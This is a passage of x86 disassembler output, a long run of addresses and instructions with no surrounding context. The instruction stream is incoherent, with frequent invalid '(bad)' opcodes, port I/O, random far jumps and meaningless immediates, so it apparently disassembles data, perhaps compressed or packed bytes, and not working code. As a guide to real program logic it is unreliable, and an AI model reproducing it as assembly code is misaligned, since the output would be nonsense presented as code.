  415572:	and    edx,DWORD PTR ds:0xfb4d6df7
  415578:	jo     0x4155f1
  41557a:	dec    esi
  41557b:	ret    0x6690
  41557e:	scas   eax,DWORD PTR es:[edi]
  41557f:	in     eax,dx
  415580:	(bad)  
  415581:	jle    0x41557a
  415583:	pop    ds
  415584:	aad    0xab
  415586:	mov    ch,0x19
  415588:	mov    eax,ds:0x150b7109
  41558d:	pushf  
  41558e:	pop    ds
  41558f:	push   esi
  415590:	repz fxch st(1)
  415593:	clc    
  415594:	cmp    al,0xce
  415596:	fs inc edx
  415598:	fsub   st,st(5)
  41559a:	pop    es
  41559b:	mov    esp,0x2968d90b
  4155a0:	xchg   edx,eax
  4155a1:	add    esi,DWORD PTR [ebx+0x6045719b]
  4155a7:	and    ecx,DWORD PTR [esi+0x26967c74]
  4155ad:	loopne 0x4155d7
  4155af:	mov    edx,0xc63ee83a
  4155b4:	ja     0x4155b2
  4155b6:	adc    al,0x41
  4155b8:	in     eax,0xcb
  4155ba:	in     eax,dx
  4155bb:	ss test al,0xa9
  4155be:	mov    ?,esi
  4155c0:	xstore-rng (bad)
  4155c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155c2:	inc    edx
  4155c3:	and    BYTE PTR [ecx+0x4e8d2429],0x7a
  4155ca:	iret   
  4155cb:	mov    al,BYTE PTR [edx]
  4155cd:	mov    dl,0xe9
  4155cf:	fidivr DWORD PTR [esi-0x26]
  4155d2:	stos   DWORD PTR es:[edi],eax
  4155d3:	inc    ebx
  4155d4:	imul   ecx
  4155d6:	es in  al,0xea
  4155d9:	bound  esp,QWORD PTR [esi]
  4155db:	shl    BYTE PTR [ebx-0x36],0x9b
  4155df:	cld    
  4155e0:	sub    cl,BYTE PTR [ecx+0x4a]
  4155e3:	scas   al,BYTE PTR es:[edi]
  4155e4:	or     dh,BYTE PTR [edi-0x4]
  4155e7:	jae    0x415608
  4155e9:	sbb    al,0x3d
  4155eb:	pop    eax
  4155ec:	or     esp,DWORD PTR [ebp-0x560fb940]
  4155f2:	push   esp
  4155f3:	push   ecx
  4155f4:	fs mov esp,0x33c5f3cb
  4155fa:	mov    dh,0x59
  4155fc:	neg    DWORD PTR [esi]
  4155fe:	mov    DWORD PTR [edx-0x28cbcdf5],edi
  415604:	lods   al,BYTE PTR ds:[esi]
  415605:	stos   BYTE PTR es:[edi],al
  415606:	dec    edx
  415607:	iret   
  415608:	and    bh,BYTE PTR [bp+di+0x4c3d]
  41560d:	(bad)  
  41560e:	cmp    ebp,ecx
  415610:	or     al,ah
  415612:	mov    ebp,0xfcd45776
  415617:	push   ecx
  415618:	add    BYTE PTR [ebx-0x3d9b5864],cl
  41561e:	mov    eax,ds:0x5f5b24ca
  415623:	dec    eax
  415624:	lods   al,BYTE PTR ds:[esi]
  415625:	sar    BYTE PTR [ebp-0x17ec3b61],1
  41562b:	jecxz  0x415604
  41562d:	add    eax,0xb586cd95
  415632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415633:	jno    0x41567f
  415635:	xor    DWORD PTR [ecx],0xffffffd7
  415638:	(bad)
  41563c:	pusha  
  41563d:	into   
  41563e:	icebp  
  41563f:	jge    0x4155f8
  415641:	or     al,0xee
  415643:	cmc    
  415644:	xchg   edx,eax
  415645:	mov    ch,0xa7
  415647:	add    eax,0xd3221f59
  41564c:	xchg   edx,eax
  41564d:	inc    ebx
  41564e:	pop    esp
  41564f:	jno    0x41564a
  415651:	mov    fs,WORD PTR [esp+esi*2]
  415654:	loop   0x41566f
  415656:	loope  0x415674
  415658:	push   0x59
  41565a:	clc    
  41565b:	sahf   
  41565c:	lods   al,BYTE PTR ds:[esi]
  41565d:	and    BYTE PTR [edi+ecx*8],0x58
  415661:	and    al,BYTE PTR [ebx]
  415663:	out    dx,eax
  415664:	fist   WORD PTR [ebx+0x116eb939]
  41566a:	pop    esp
  41566b:	std    
  41566c:	xchg   ecx,eax
  41566d:	lahf   
  41566e:	dec    edi
  41566f:	stc    
  415670:	mov    dh,0xd5
  415672:	ror    DWORD PTR [eax+edi*2-0x3698b02b],cl
  415679:	push   edx
  41567a:	jmp    0xc0ad:0x95ae9318
  415681:	repz mov ebx,0x622883ad
  415687:	push   es
  415688:	and    eax,0x64a57da0
  41568d:	pop    ds
  41568e:	lds    ebx,FWORD PTR [ebx]
  415690:	addr16 jg 0x415650
  415693:	mov    ebp,0x42e5d57e
  415698:	callw  0xb965
  41569c:	jle    0x415686
  41569e:	or     eax,0x2a5cc93e
  4156a3:	cld    
  4156a4:	lds    edi,FWORD PTR [edx-0x4b]
  4156a7:	cmp    dl,BYTE PTR ds:0xa4c2cdec
  4156ad:	xchg   DWORD PTR [ebp+0x25],ecx
  4156b0:	or     DWORD PTR [eax-0x303cd24e],eax
  4156b6:	jl     0x415716
  4156b8:	mov    al,0x63
  4156ba:	mov    ds:0x7604a339,al
  4156bf:	pushf  
  4156c0:	inc    edx
  4156c1:	pop    ss
  4156c2:	test   BYTE PTR [ebx+edx*2],bl
  4156c5:	scas   eax,DWORD PTR es:[edi]
  4156c6:	scas   eax,DWORD PTR es:[edi]
  4156c7:	and    BYTE PTR [esi],0x26
  4156ca:	mov    al,0xfb
  4156cc:	test   DWORD PTR [esi+0x3f],0xda1f3b64
  4156d3:	mov    al,ds:0x34d27b5e
  4156d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156d9:	imul   eax,ebx,0xa67f5735
  4156df:	sub    esp,0x302a02e5
  4156e5:	mov    edx,0x69914a46
  4156ea:	mov    bh,0x83
  4156ec:	call   0xf4ae40f7
  4156f1:	add    eax,0xc96d73d1
  4156f6:	or     ah,bh
  4156f8:	cmp    eax,0xe5fcb1b4
  4156fd:	fistp  DWORD PTR ss:[ebx-0x6c]
  415701:	int3   
  415702:	ds add cl,dl
  415705:	daa    
  415706:	out    dx,eax
  415707:	outs   dx,BYTE PTR ds:[esi]
  415708:	jmp    0x415752
  41570a:	push   ecx
  41570b:	leave  
  41570c:	in     al,dx
  41570d:	je     0x415698
  41570f:	jae    0x4156c0
  415711:	push   eax
  415712:	pop    edi
  415713:	sub    cl,BYTE PTR [esi]
  415715:	or     al,0x89
  415717:	xor    DWORD PTR ds:0x2d892221,ebx
  41571d:	ss (bad) 
  41571f:	loop   0x41572e
  415721:	mov    edi,0xe2a3b462
  415726:	jg     0x4156d6
  415728:	push   cs
  415729:	pop    esp
  41572a:	js     0x41570e
  41572c:	mov    ecx,0xd4de5976
  415731:	jmp    0x5499:0x1b0ee193
  415738:	sbb    BYTE PTR [ebx],0xe5
  41573b:	pop    esp
  41573c:	ror    DWORD PTR [edi-0x3f],0xbe
  415740:	arpl   sp,si
  415742:	sahf   
  415743:	xchg   edi,eax
  415744:	xchg   ecx,eax
  415745:	add    al,0x8c
  415747:	inc    esp
  415748:	popf   
  415749:	loope  0x4156d2
  41574b:	dec    ebx
  41574c:	inc    ebp
  41574d:	mov    gs,esp
  41574f:	das    
  415750:	test   al,0xe6
  415752:	je     0x4156d8
  415754:	cmp    bl,BYTE PTR [ebx]
  415756:	enter  0xda0,0xd8
  41575a:	push   esp
  41575b:	and    dh,al
  41575d:	sub    BYTE PTR [ebx],dl
  41575f:	inc    eax
  415761:	cmp    ecx,DWORD PTR [ebp+0x1474a50]
  415767:	stos   BYTE PTR es:[edi],al
  415768:	pop    ebx
  415769:	repnz retf 0x39e4
  41576d:	jne    0x415761
  41576f:	mov    ds:0x8f3d061a,al
  415774:	jne    0x4157c0
  415776:	cli    
  415777:	aas    
  415778:	retf   0x149f
  41577b:	dec    ebp
  41577c:	out    dx,eax
  41577d:	je     0x41576c
  41577f:	imul   eax,edi,0x1a
  415782:	dec    eax
  415783:	scas   eax,DWORD PTR es:[edi]
  415784:	out    0x8f,eax
  415786:	shl    BYTE PTR [eax+edi*8-0x7c],0x59
  41578b:	cmp    eax,0xa093f966
  415790:	cld    
  415791:	in     al,dx
  415792:	aaa    
  415793:	test   al,0x41
  415795:	in     eax,dx
  415796:	lock out 0x93,eax
  415799:	mov    al,ds:0x345a9a3f
  41579e:	mov    esi,0x9f438a98
  4157a3:	(bad)  
  4157a4:	push   0x373e3805
  4157a9:	jmp    0x4157f4
  4157ab:	aad    0xac
  4157ad:	push   cs
  4157ae:	ds stos BYTE PTR es:[edi],al
  4157b0:	adc    al,0xc9
  4157b2:	loopne 0x4157bb
  4157b4:	mov    edx,0x7d17ff87
  4157b9:	cld    
  4157ba:	cmp    edx,DWORD PTR [edi+0x31]
  4157bd:	xchg   ebx,eax
  4157be:	mov    cl,BYTE PTR [edx]
  4157c0:	adc    DWORD PTR [ebx+0x58da2be1],edx
  4157c6:	retf   
  4157c7:	call   0x888b:0xf55046f3
  4157ce:	push   0x74
  4157d0:	icebp  
  4157d1:	lahf   
  4157d2:	sahf   
  4157d3:	sbb    eax,0x157cf7d5
  4157d8:	enter  0xd52c,0xda
  4157dc:	test   al,0x76
  4157de:	xchg   esp,eax
  4157df:	call   0x9f51:0x23530566
  4157e6:	xchg   DWORD PTR [ecx-0x1c],esi
  4157e9:	jmp    0x478e:0x8ad19a7c
  4157f0:	mov    eax,ds:0x53ff2991
  4157f5:	int3   
  4157f6:	test   DWORD PTR fs:[eax+0x31],esi
  4157fa:	dec    ebp
  4157fb:	std    
  4157fc:	pushf  
  4157fd:	push   cs
  4157fe:	cwde   
  4157ff:	mov    al,ds:0x60fde459
  415804:	xchg   edx,eax
  415805:	sub    ebx,esp
  415807:	pop    ecx
  415808:	xchg   ebp,eax
  415809:	mov    ecx,0xd0edd85a
  41580e:	dec    ecx
  41580f:	dec    edi
  415810:	xlat   BYTE PTR ds:[ebx]
  415811:	push   0xffffffd9
  415813:	rcr    BYTE PTR [ebp-0xf],0x75
  415817:	call   0x2c87bd79
  41581c:	mov    ebx,0x3da09f3
  415821:	call   0xf79e:0xf18373b1
  415828:	mov    esp,0x5fce75a3
  41582d:	mov    dh,0x84
  41582f:	xchg   ebp,eax
  415830:	xchg   ecx,eax
  415831:	mov    eax,ds:0xc23e0577
  415836:	push   ds
  415837:	lock imul edi,DWORD PTR [edx],0xd96f916d
  41583e:	fdivrp st(4),st
  415840:	jecxz  0x415895
  415842:	inc    ecx
  415843:	test   eax,0xfd2d1176
  415848:	mov    ch,0xf7
  41584a:	xchg   dh,bh
  41584c:	fcomp  st(4)
  41584e:	cli    
  41584f:	push   cs
  415850:	(bad)  
  415851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415852:	xchg   eax,esp
  415854:	(bad)  [edx-0x24fab8e0]
  41585a:	aam    0xa2
  41585c:	popf   
  41585d:	mov    dh,0x6
  41585f:	xchg   esp,eax
  415860:	adc    ebp,DWORD PTR [esi-0x3b]
  415863:	cmp    eax,0x523b55d2
  415868:	fist   DWORD PTR [ebx]
  41586a:	push   eax
  41586b:	(bad)  
  41586c:	ja     0x415893
  41586e:	dec    esp
  41586f:	and    al,0x39
  415871:	in     al,dx
  415872:	loopne 0x4158ef
  415874:	mov    al,ds:0x8d20d13d
  415879:	cmp    bl,BYTE PTR [edx+0x2c]
  41587c:	(bad)  
  41587d:	fstp   QWORD PTR [ecx-0x71]
  415880:	iret   
  415881:	data16 sti 
  415883:	fisttp QWORD PTR [edx-0x1a4f0c52]
  415889:	inc    esi
  41588a:	sbb    eax,0xab6b00d7
  41588f:	int    0xfa
  415891:	ret    0x61fb
  415894:	mov    bh,0x17
  415896:	mov    edx,0xfdd9d309
  41589b:	mov    DWORD PTR [eax+esi*8-0x855f586],eax
  4158a2:	and    al,BYTE PTR [ecx-0x7b]
  4158a5:	inc    edi
  4158a6:	mov    sp,0x3cdb
  4158aa:	dec    esp
  4158ab:	mov    bl,0x2b
  4158ad:	inc    edx
  4158ae:	jae    0x4158ec
  4158b0:	push   eax
  4158b1:	mov    bh,0x4b
  4158b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158b4:	jno    0x41583d
  4158b6:	sar    dh,0x6c
  4158b9:	fadd   DWORD PTR [edi+0x72]
  4158bc:	in     eax,dx
  4158bd:	sbb    eax,0x99d1dab5
  4158c2:	jge    0x415939
  4158c4:	sub    edi,DWORD PTR ds:0x962c8235
  4158ca:	mov    ds:0x3f8a76c5,eax
  4158cf:	mov    bh,0x6b
  4158d1:	sbb    DWORD PTR [edi+edi*8],eax
  4158d4:	jae    0x4158cf
  4158d6:	or     bl,BYTE PTR [ebx]
  4158d8:	xchg   ecx,eax
  4158d9:	in     al,0x9f
  4158db:	sets   BYTE PTR [esi-0x9]
  4158df:	push   cs
  4158e0:	add    eax,0x52804142
  4158e5:	mov    cl,0x44
  4158e7:	lea    edx,[eax]
  4158e9:	dec    ebp
  4158ea:	cmp    esi,DWORD PTR [esi-0x30373d9]
  4158f0:	daa    
  4158f1:	fldcw  WORD PTR [ebp-0x2856cde2]
  4158f7:	(bad)  
  4158f8:	push   eax
  4158f9:	shl    BYTE PTR [ecx+0x40],cl
  4158fc:	ins    DWORD PTR es:[edi],dx
  4158fd:	je     0x41593c
  4158ff:	sub    al,0xa1
  415901:	adc    esp,DWORD PTR [esi+0x776f06ed]
  415907:	pushf  
  415908:	push   0xfffffff2
  41590a:	sbb    ebx,edi
  41590c:	ret    0x7336
  41590f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415910:	jp     0x4158c9
  415912:	out    dx,al
  415913:	int    0xd1
  415915:	or     BYTE PTR [ebp+0x7e],0x8a
  415919:	inc    edx
  41591a:	test   ax,0x70e6
  41591e:	jmp    0x138d:0xf6627b4b
  415925:	dec    esi
  415926:	xchg   ecx,eax
  415927:	adc    eax,0xe64b14ce
  41592c:	aad    0x64
  41592e:	je     0x4158db
  415930:	addr16 mov eax,ds:0xce40
  415934:	imul   ecx,ebx,0x5934cf91
  41593a:	out    dx,al
  41593b:	mov    ebp,0x7f5fcbd1
  415940:	cmp    BYTE PTR [edx-0x55],dh
  415943:	hlt    
  415944:	jns    0x415982
  415946:	mov    esi,0xaa84af8e
  41594b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41594c:	dec    eax
  41594d:	mov    ah,0x2f
  41594f:	mov    ah,0x87
  415951:	fwait
  415952:	ror    DWORD PTR [ebx+0x51],0xa
  415956:	(bad)  
  415958:	popf   
  415959:	fldenv [edx]
  41595b:	xor    DWORD PTR [ecx-0xf],0x72058c60
  415962:	xchg   edx,eax
  415963:	lock pop esp
  415965:	shr    DWORD PTR [ecx-0x7e],cl
  415968:	cdq    
  415969:	adc    eax,0x41111650
  41596e:	std    
  41596f:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  415971:	pop    ebx
  415972:	(bad)  
  415973:	dec    edx
  415974:	mov    bh,cl
  415976:	pop    ds
  415977:	repz mov dl,BYTE PTR [eax+0x1a]
  41597b:	outs   dx,BYTE PTR ds:[esi]
  41597c:	push   edx
  41597d:	jmp    0x130e32ce
  415982:	xor    BYTE PTR [esi+0x47],dh
  415985:	xor    BYTE PTR [esi-0x5e],bl
  415988:	adc    ebx,DWORD PTR [ebp+0x2]
  41598b:	ins    BYTE PTR es:[edi],dx
  41598c:	nop
  41598d:	jmp    0xfb3f17e9
  415992:	xor    BYTE PTR [edi-0x41],0xf7
  415996:	pop    edx
  415997:	push   ecx
  415998:	(bad)  
  415999:	ror    BYTE PTR ds:0xf40df0cd,1
  41599f:	(bad)  
  4159a1:	xchg   DWORD PTR [edi+0x2a5a1434],ecx
  4159a7:	daa    
  4159a8:	pop    eax
  4159a9:	inc    ecx
  4159aa:	lods   al,BYTE PTR ds:[esi]
  4159ab:	inc    edx
  4159ac:	cmp    al,0xa3
  4159ae:	inc    esi
  4159af:	(bad)
  4159b3:	jmp    0xdcc:0xc0dfcce
  4159ba:	lods   eax,DWORD PTR ds:[esi]
  4159bb:	xchg   ebx,eax
  4159bc:	and    eax,0x7405981d
  4159c1:	add    dl,bh
  4159c3:	ficomp WORD PTR [edi+esi*8]
  4159c6:	sbb    al,0x9a
  4159c8:	xor    cl,BYTE PTR [ebx]
  4159ca:	aam    0x41
  4159cc:	mov    bh,0xfd
  4159ce:	cdq    
  4159cf:	scas   al,BYTE PTR es:[edi]
  4159d0:	in     al,0xe3
  4159d2:	pop    es
  4159d3:	lods   al,BYTE PTR ds:[esi]
  4159d4:	rcr    DWORD PTR [ecx],cl
  4159d6:	popf   
  4159d7:	popa   
  4159d8:	lods   al,BYTE PTR ds:[esi]
  4159d9:	clc    
  4159da:	add    BYTE PTR [esi+0x2de32c7b],0xe2
  4159e1:	add    ebx,esi
  4159e3:	jle    0x415983
  4159e5:	adc    cl,BYTE PTR [edx+0x5689793b]
  4159eb:	std    
  4159ec:	out    0xca,al
  4159ee:	cmp    dl,cl
  4159f0:	aam    0x1c
  4159f2:	fdiv   QWORD PTR [esi]
  4159f4:	ror    dl,1
  4159f6:	cmp    BYTE PTR [edx],cl
  4159f8:	aam    0x68
  4159fa:	shr    DWORD PTR [ecx],1
  4159fc:	daa    
  4159fd:	bound  ecx,QWORD PTR [edx+0xa]
  415a00:	or     esi,DWORD PTR [edi+0x5b4e06fe]
  415a06:	dec    edx
  415a07:	call   0xd9f8f578
  415a0c:	jno    0x4159b5
  415a0e:	push   ss
  415a0f:	add    dh,al
  415a11:	fcom   DWORD PTR [eax-0x14]
  415a14:	mov    bh,0x3a
  415a16:	scas   al,BYTE PTR es:[edi]
  415a17:	add    dh,BYTE PTR [eax+edi*4+0xdc184e9]
  415a1e:	jp     0x415a5d
  415a20:	jl     0x4159be
  415a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a23:	popa   
  415a24:	sbb    DWORD PTR [esi+0x6e9adfa8],0xb0e3e30d
  415a2e:	scas   al,BYTE PTR es:[edi]
  415a2f:	cdq    
  415a30:	jae    0x415a93
  415a32:	out    0x4a,al
  415a34:	test   al,0x3a
  415a36:	cld    
  415a37:	mov    fs,WORD PTR [ebx+esi*8]
  415a3a:	jb     0x415a91
  415a3c:	outs   dx,BYTE PTR ds:[esi]
  415a3d:	push   0xffffffed
  415a3f:	mov    DWORD PTR [edi+0x1e],ecx
  415a42:	mov    ch,BYTE PTR ds:0x7abe2543
  415a48:	or     eax,0x3984739a
  415a4d:	sbb    al,0x50
  415a4f:	add    cl,bl
  415a51:	out    dx,eax
  415a52:	push   0x7e737efc
  415a57:	pop    ebx
  415a58:	bound  ebx,QWORD PTR [ebp+0x7b]
  415a5b:	dec    ebx
  415a5c:	(bad)  
  415a5d:	pop    ds
  415a5e:	dec    BYTE PTR [ebx-0x13]
  415a61:	mov    dh,ch
  415a63:	add    al,bl
  415a65:	adc    DWORD PTR ds:[eax-0x6b],esp
  415a69:	fld    st(1)
  415a6b:	xchg   ebp,eax
  415a6c:	sbb    DWORD PTR [ecx],ebx
  415a6e:	es pop esi
  415a70:	push   0x92cd73f6
  415a75:	adc    edx,DWORD PTR es:[ebx]
  415a78:	cli    
  415a79:	mov    dl,0xdb
  415a7b:	sub    cl,0x6c
  415a7e:	pop    edx
  415a7f:	add    esp,DWORD PTR [eax]
  415a81:	not    DWORD PTR [ecx+0x39]
  415a84:	or     ah,BYTE PTR [edx+0x982687d]
  415a8a:	sbb    eax,0x487df5f5
  415a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a90:	scas   eax,DWORD PTR es:[edi]
  415a91:	xchg   ebx,eax
  415a92:	in     eax,0x6e
  415a94:	mov    bh,0xed
  415a96:	adc    al,0xbf
  415a98:	int3   
  415a99:	jle    0x415a3c
  415a9b:	push   edi
  415a9c:	add    al,0xb1
  415a9e:	and    BYTE PTR [esi],ah
  415aa0:	ret    
  415aa1:	shl    ch,cl
  415aa3:	repz pop esi
  415aa5:	test   al,0x44
  415aa7:	in     al,0x78
  415aa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415aaa:	mov    eax,ds:0x883c64a
  415aaf:	bound  edx,QWORD PTR [ebx+0x64]
  415ab2:	pop    esp
  415ab3:	jle    0x415a5c
  415ab5:	dec    edx
  415ab6:	jne    0x415a3d
  415ab8:	repz aaa 
  415aba:	jmp    0x195e3de2
  415abf:	xor    DWORD PTR [edi+0x2f],esi
  415ac2:	mov    ecx,esp
  415ac4:	fwait
  415ac5:	js     0x415a56
  415ac7:	jp     0x415b26
  415ac9:	nop
  415aca:	lock push es
  415acc:	mov    edi,0x4020125a
  415ad1:	dec    ecx
  415ad2:	fld    DWORD PTR [ebx]
  415ad4:	std    
  415ad5:	aaa    
  415ad6:	inc    esp
  415ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ad8:	stos   BYTE PTR es:[edi],al
  415ad9:	pop    esp
  415ada:	lods   eax,DWORD PTR ds:[esi]
  415adb:	push   eax
  415adc:	mov    cl,0xf8
  415ade:	add    eax,0xf5487f48
  415ae3:	mov    bl,0xa2
  415ae5:	das    
  415ae6:	fadd   st(6),st
  415ae8:	or     edx,DWORD PTR [edi-0x36]
  415aeb:	int    0xeb
  415aed:	cmp    eax,0x2882c0
  415af2:	and    esi,DWORD PTR [ebx]
  415af4:	mov    dh,BYTE PTR [esi-0x7c]
  415af7:	(bad)  
  415af8:	adc    eax,DWORD PTR [ebx]
  415afa:	sbb    al,0x28
  415afc:	cmp    eax,DWORD PTR [edi]
  415afe:	loopne 0x415b33
  415b00:	xor    eax,0x34368e0c
  415b05:	imul   ebx,DWORD PTR [ebx-0x3f90a74],0x207b2f75
  415b0f:	pop    ss
  415b10:	shl    BYTE PTR [esi-0x30c5509f],cl
  415b16:	or     al,0x44
  415b18:	mov    DWORD PTR [edi-0x2e],esi
  415b1b:	xchg   ecx,eax
  415b1c:	add    BYTE PTR [edx+0x68],0x78
  415b20:	jmp    0xa88d:0x7b359f09
  415b27:	leave  
  415b28:	and    esi,DWORD PTR [edx]
  415b2a:	xor    al,BYTE PTR [esp+esi*2+0x78]
  415b2e:	add    ecx,DWORD PTR [ebx+0x2ec3a0ff]
  415b34:	jo     0x415ad3
  415b36:	addr16 xchg ebp,eax
  415b38:	ins    BYTE PTR es:[edi],dx
  415b39:	push   cs
  415b3a:	mov    edx,eax
  415b3c:	sti    
  415b3d:	and    eax,0xf5b6d2a9
  415b42:	inc    ebp
  415b43:	sbb    eax,0x8b039f3b
  415b48:	test   DWORD PTR [ebx-0x9acc01],eax
  415b4e:	outs   dx,BYTE PTR ds:[esi]
  415b4f:	cmp    BYTE PTR [esp+ebx*8-0x37],ah
  415b53:	xchg   ebp,eax
  415b54:	adc    eax,0x2fb7541b
  415b59:	jge    0x415b8b
  415b5b:	pop    ebx
  415b5c:	bound  edi,QWORD PTR [eax+0xb]
  415b5f:	mov    ecx,0x30ed9ae4
  415b64:	push   edi
  415b65:	mov    ah,0xfd
  415b67:	daa    
  415b68:	js     0x415be2
  415b6a:	jge    0x415b25
  415b6c:	pop    ebx
  415b6d:	in     al,dx
  415b6e:	icebp  
  415b6f:	xchg   ebx,eax
  415b70:	out    dx,al
  415b71:	push   ecx
  415b72:	shl    eax,cl
  415b74:	stos   DWORD PTR es:[edi],eax
  415b75:	sbb    dl,dl
  415b77:	jb     0x415b34
  415b79:	aaa    
  415b7a:	cli    
  415b7b:	nop
  415b7c:	dec    eax
  415b7d:	dec    esp
  415b7e:	fisubr DWORD PTR [edx+0x7b69637d]
  415b84:	push   ds
  415b85:	call   0x8001:0x8dbd85dc
  415b8c:	(bad)  
  415b8d:	mov    al,0x6d
  415b8f:	jmp    0xd6c4:0x21b425c0
  415b96:	sbb    DWORD PTR [ebp-0x2],esp
  415b99:	mov    dh,0x2c
  415b9b:	mov    ebx,0x86f35219
  415ba0:	mov    ds:0x1439d1da,al
  415ba5:	ins    DWORD PTR es:[edi],dx
  415ba6:	add    ecx,DWORD PTR [ecx+0x7665eccc]
  415bac:	xchg   ebx,eax
  415bad:	cld    
  415bae:	ds loope 0x415b48
  415bb1:	clc    
  415bb2:	xchg   esp,eax
  415bb3:	ret    0xa3da
  415bb6:	sbb    eax,0xd2355a9
  415bbb:	dec    edx
  415bbc:	jle    0x415b6e
  415bbe:	dec    ebp
  415bbf:	ins    DWORD PTR es:[edi],dx
  415bc0:	aad    0xf2
  415bc2:	call   0xbcc34327
  415bc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bc8:	loopne 0x415c16
  415bca:	scas   al,BYTE PTR es:[edi]
  415bcb:	sbb    bh,BYTE PTR [edx+0x3dfbb46b]
  415bd1:	test   BYTE PTR ds:0xe2a5d05d,ch
  415bd7:	and    al,0xdd
  415bd9:	mov    eax,ds:0xb6cd2613
  415bde:	dec    eax
  415bdf:	sub    edx,eax
  415be1:	sub    DWORD PTR [ecx-0x634afc2b],esp
  415be7:	or     eax,0xf6d04282
  415bec:	xchg   esi,eax
  415bed:	cwde   
  415bee:	imul   DWORD PTR [ebx-0x209f4772]
  415bf4:	and    esi,DWORD PTR ds:0x469b30d9
  415bfa:	inc    esi
  415bfb:	scas   al,BYTE PTR es:[edi]
  415bfc:	xlat   BYTE PTR ds:[ebx]
  415bfd:	mov    esi,edx
  415bff:	(bad)  [ecx+0x14d81c8e]
  415c05:	stos   BYTE PTR es:[edi],al
  415c06:	mov    ecx,0x7bd49d74
  415c0b:	je     0x415bd5
  415c0d:	in     al,dx
  415c0e:	pop    ebp
  415c10:	dec    esp
  415c11:	mov    al,ds:0x76ac350f
  415c16:	jae    0x415bcb
  415c18:	mov    dl,0x99
  415c1a:	mov    eax,ds:0xa914948e
  415c1f:	jecxz  0x415c0b
  415c21:	push   es
  415c22:	outs   dx,DWORD PTR ds:[esi]
  415c23:	jp     0x415bd5
  415c25:	xchg   esi,eax
  415c26:	mov    eax,0xca32c581
  415c2b:	popf   
  415c2c:	sbb    bh,BYTE PTR [ecx+0x5c1c5e64]
  415c32:	jns    0x415c6a
  415c34:	pop    esp
  415c35:	or     al,0x55
  415c37:	imul   BYTE PTR [edx-0x28d83cf8]
  415c3d:	addr16 jle 0x415c32
  415c40:	out    dx,eax
  415c41:	fcomp  DWORD PTR [eax]
  415c43:	sbb    esp,edx
  415c45:	xor    ah,BYTE PTR [esp+esi*8]
  415c48:	or     edx,DWORD PTR ds:0xbfc410e4
  415c4e:	mov    ecx,0x923a265c
  415c53:	or     BYTE PTR [ebp-0x600d3c2f],ah
  415c59:	stc    
  415c5a:	test   al,0x6f
  415c5c:	jecxz  0x415cb9
  415c5e:	arpl   di,cx
  415c60:	jmp    0x9e76:0xe1e40b76
  415c67:	push   ebp
  415c68:	outs   dx,DWORD PTR ds:[esi]
  415c69:	and    DWORD PTR [edi+edx*1],0x899d036b
  415c70:	mov    BYTE PTR [esi],ah
  415c72:	inc    ebx
  415c73:	dec    edx
  415c74:	fsub   DWORD PTR [esi+0x7fe4e352]
  415c7a:	rcr    DWORD PTR [edx-0x30583c18],cl
  415c80:	pop    eax
  415c81:	imul   eax,DWORD PTR [ebp-0x40],0xffffffaf
  415c85:	adc    cl,cl
  415c87:	bound  ebx,QWORD PTR [edx+eiz*8+0x54c9943d]
  415c8e:	daa    
  415c8f:	xchg   ah,al
  415c91:	ds ja  0x415cb8
  415c94:	cwde   
  415c95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c96:	sbb    BYTE PTR [esi],dl
  415c98:	(bad)  
  415c99:	in     eax,dx
  415c9a:	add    al,0x73
  415c9c:	jmp    0x6ac5:0x912c5bc5
  415ca3:	inc    eax
  415ca4:	clc    
  415ca5:	mov    ebx,0xfe2d0d59
  415caa:	or     edi,eax
  415cac:	out    0xd4,eax
  415cae:	icebp  
  415caf:	push   edx
  415cb0:	imul   eax,ebp,0x7a
  415cb3:	sbb    BYTE PTR [edx-0x2156894d],ah
  415cb9:	cmp    BYTE PTR [edx+ebx*1],ch
  415cbc:	push   es
  415cbd:	pushf  
  415cbe:	sub    ch,ch
  415cc0:	ja     0x415cf9
  415cc2:	lock out 0x69,eax
  415cc5:	dec    ecx
  415cc6:	cmovae ebx,DWORD PTR [edx+eax*4+0x3f]
  415ccb:	dec    ebp
  415ccc:	push   DWORD PTR [esi-0xdf6c99c]
  415cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cd3:	ss call 0x22d242fd
  415cd9:	or     WORD PTR [esi],sp
  415cdc:	add    ebx,DWORD PTR [ebp-0x26]
  415cdf:	mov    BYTE PTR [ebx],bl
  415ce1:	test   BYTE PTR [edx],bl
  415ce3:	ss out dx,al
  415ce5:	ret    
  415ce6:	ja     0x415d56
  415ce8:	out    dx,al
  415ce9:	inc    esi
  415cea:	fldenv [esi-0x3f]
  415ced:	int3   
  415cee:	inc    edx
  415cef:	imul   ebp,DWORD PTR [esi-0x21140569],0x54
  415cf6:	(bad)  
  415cf7:	ins    BYTE PTR es:[edi],dx
  415cf8:	out    dx,eax
  415cf9:	pusha  
  415cfa:	into   
  415cfb:	mov    eax,0xd076245c
  415d00:	adc    ecx,DWORD PTR [ecx+0x6cd72b36]
  415d06:	out    dx,eax
  415d07:	mov    cl,BYTE PTR [edi]
  415d09:	daa    
  415d0a:	jo     0x415cfd
  415d0c:	and    DWORD PTR [ebx],ebp
  415d0e:	and    eax,0x58c8f0ff
  415d13:	inc    esi
  415d14:	jmp    0xce35:0x765a
  415d1a:	mov    cl,0xb1
  415d1c:	or     bl,BYTE PTR [ebp+ebp*1-0x48be6636]
  415d23:	and    DWORD PTR [eax+ecx*1-0x6a3010c],ecx
  415d2a:	jp     0x415d97
  415d2c:	mov    ds:0x787a1b52,al
  415d31:	aaa    
  415d32:	mov    bl,0xc0
  415d34:	xor    DWORD PTR [edx+ebx*4-0x7444e67d],eax
  415d3b:	pop    esp
  415d3c:	int    0xdc
